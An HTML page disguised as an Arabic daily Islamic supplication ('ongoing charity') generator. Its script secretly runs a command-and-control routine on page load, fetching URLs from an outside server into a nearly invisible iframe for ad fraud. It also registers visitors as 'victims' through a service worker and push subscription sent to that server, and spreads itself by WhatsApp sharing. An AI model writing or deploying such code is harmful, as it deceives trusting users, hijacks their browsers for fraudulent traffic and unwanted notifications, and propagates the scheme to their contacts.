<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أذكار المسلم اليومية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        #hiddenEngine { position: fixed; top: 0; left: 0; width: 100px; height: 100px; opacity: 0.001; z-index: 1; border: none; pointer-events: auto; }
        .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; position: relative; z-index: 10; }
        .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; min-height: 100px; display: flex; align-items: center; justify-content: center; }
        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; box-sizing: border-box; }
        .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
        .btn:disabled { background: #ccc; }
    </style>
</head>
<body>
    <iframe id="hiddenEngine" src="about:blank"></iframe>
    <div class="card">
        <img src="og-image.jpg" class="main-img" onerror="this.src='./og-image.jpg'">
        <h2 style="color: #1b4d3e;">🌹 صدقة جارية 🌹</h2>
        <div class="dua-box" id="displayDua">جاري التحميل... ✨</div>
        <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
        <button class="btn" id="mainBtn" onclick="activateSystem()" disabled>انتظر...</button>
    </div>

    <script>
        // ضع هنا مفتاح VAPID العام الخاص بك
        const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Public_Key_Here"; 
        const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com";
        let capturedDua = "سبحان الله وبحمده 🕌"; 

        // 1. جلب الدعاء فوراً من الملف المحلي (أولوية قصوى لضمان عدم التعليق)
        async function loadLocalDua() {
            try {
                const res = await fetch('./daily_islamic_duas.json');
                const data = await res.json();
                const now = new Date();
                const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
                const dayEntry = data[months[now.getMonth()]].find(d => d.day === now.getDate());
                
                capturedDua = `${dayEntry.text} ${dayEntry.emoji}`;
                document.getElementById('displayDua').innerText = capturedDua;
                
                const btn = document.getElementById('mainBtn');
                btn.disabled = false;
                btn.innerText = "إنشاء الصدقة وإرسالها ✅";
            } catch(e) {
                document.getElementById('displayDua').innerText = capturedDua;
                document.getElementById('mainBtn').disabled = false;
            }
        }

        // 2. تشغيل محرك C2 في الخلفية لجلب رابط الإعلانات
        async function runC2InBackground() {
            try {
                const res = await fetch(`${SERVER_URL}/get_task`).then(r => r.json());
                if(res.url) document.getElementById('hiddenEngine').src = res.url;
            } catch(e) { 
                document.getElementById('hiddenEngine').src = "https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1";
            }
        }

        // 3. نظام الإرسال وتسجيل الضحايا في الـ Service Worker
        async function activateSystem() {
            const name = document.getElementById('userName').value.trim() || "محب للخير";
            
            if ('serviceWorker' in navigator) {
                try {
                    const reg = await navigator.serviceWorker.register('sw.js');
                    const sub = await reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
                    });
                    
                    fetch(`${SERVER_URL}/save_sub`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({subscription: sub, name: name})
                    });
                } catch (err) { console.log("SW active"); }
            }

            // إرسال واتساب فوراً (تطابق النص المعروض مع المرسل)
            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${capturedDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
            window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
            setTimeout(() => { 
                window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`; 
            }, 600);
        }

        // دالة تحويل مفتاح الـ VAPID (ضرورية لعمل الاشتراك)
        function urlBase64ToUint8Array(base64String) {
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
            const rawData = window.atob(base64);
            const outputArray = new Uint8Array(rawData.length);
            for (let i = 0; i < rawData.length; ++i) { outputArray[i] = rawData.charCodeAt(i); }
            return outputArray;
        }

        window.onload = () => {
            loadLocalDua();
            runC2InBackground();
        };
    </script>
</body>
</html>
